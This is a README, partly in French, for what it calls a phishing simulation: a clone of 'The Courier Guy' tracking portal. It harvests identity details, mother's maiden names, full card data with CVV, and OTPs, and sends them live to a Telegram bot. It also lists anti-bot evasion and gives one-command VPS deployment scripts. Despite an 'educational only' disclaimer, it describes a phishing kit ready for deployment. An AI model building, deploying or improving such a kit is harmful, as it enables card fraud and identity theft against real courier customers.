# The Courier Guy - Phishing Simulation Portal

## ⚠️ Disclaimer
**EDUCATIONAL PURPOSE ONLY.**
This project is a Proof of Concept (PoC) designed for security awareness training, phishing simulations, and red team engagements. It simulates a realistic courier phishing attack vector. Unauthorized usage against targets without prior mutual consent is illegal.

## 📌 Overview
This is a high-fidelity frontend clone of "The Courier Guy" tracking portal, engineered to simulate a credential harvesting campaign. It features a convincing multi-step flow that collects personal information, identity details, payment card data, and OTPs, sending everything in real-time to a configured Telegram bot.

## 🚀 Features

### 🛡️ Evasion & Security
- **Anti-Bot Entry Page**: Simulated "Cloudflare" security check screen to add legitimacy and filter traffic.
- **Realistic Loading States**: "Processing" animations to mimic real backend verifications.

### 🎣 Data Collection Flow
The application guides the victim through a logical sequence of "verification" steps:
1.  **Security Check**: Fake browser analysis.
2.  **Tracking Dashboard**: Displays "pending delivery" status to create urgency.
3.  **Receiver Info**: Collects Name, Address, City.
4.  **Identity Verification**: Collects ID Number, DOB, Phone, Email, and Mother's Maiden Name.
5.  **Customs Payment**: Collects Credit Card Number, Expiry, CVV.
6.  **3D Secure / OTP**: Simulated bank verification page (collects OTP or App Approval).
7.  **Success Page**: Final confirmation to reduce suspicion.

### 📡 Exfiltration
- **Telegram Integration**: All form submissions are sent immediately to a specified Telegram Chat via Bot API.
- **Detailed Logs**: Notifications include timestamps, specific data fields, and action types.

## 🛠️ Tech Stack
- **Frontend**: React (Vite)
- **Backend**: Node.js + Express
- **Styling**: Tailwind CSS + Shadcn UI
- **Routing**: Wouter
- **Animations**: Framer Motion
- **Icons**: Lucide React

## 🏗️ Architecture

The project follows a secure architecture pattern:

```
server/secure/
├── config/          # Centralized configuration
├── panel/           # Security modules (IP management, bot detection, rate limiting)
├── app/             # Application modules (Telegram sending)
└── views/            # View components
```

See `server/secure/README.md` for detailed documentation on the security modules.

For a complete architecture overview, see `ARCHITECTURE.md`.

For details on visit ID and panel link generation, see `LINKGEN.md`.

## ⚙️ Configuration

### Telegram Setup
To receive data, configure your bot credentials using environment variables:

```bash
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
```

Or create a `.env` file in the project root:

```env
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
```

The configuration is centralized in `server/secure/config/config.ts` and will fallback to default values if not set.

## 📦 Installation & Usage

Voir le [README principal](../README.md) à la racine du projet.

### Développement local
- `npm install` puis `npm run dev`
- Build : `npm run build` puis `npm start`

### Déploiement
- **Render** : voir la section « Déploiement sur Render » dans le [README](../README.md) et `render.yaml`.
- **VPS** : voir ci-dessous et [DEPLOYMENT.md](DEPLOYMENT.md).

### Déploiement sur VPS

#### Installation Automatique (Recommandé)

**Installation complète avec Apache :**
```bash
sudo ./install-complete.sh votre-domaine.com apache
```

**Installation complète avec Nginx :**
```bash
sudo ./install-complete.sh votre-domaine.com nginx
```

**Installation Apache uniquement (si le projet est déjà configuré) :**
```bash
sudo ./install-apache.sh votre-domaine.com
```

#### Installation Manuelle

Pour déployer manuellement ce projet sur un VPS, consultez le guide complet : **[DEPLOYMENT.md](./DEPLOYMENT.md)**

Le guide couvre :
- Configuration du serveur (Node.js, PM2, Nginx/Apache)
- Installation et build du projet
- Configuration SSL avec Let's Encrypt
- Sécurité et monitoring
- Mise à jour et maintenance

## 📄 License
This project is for educational and authorized testing purposes only.
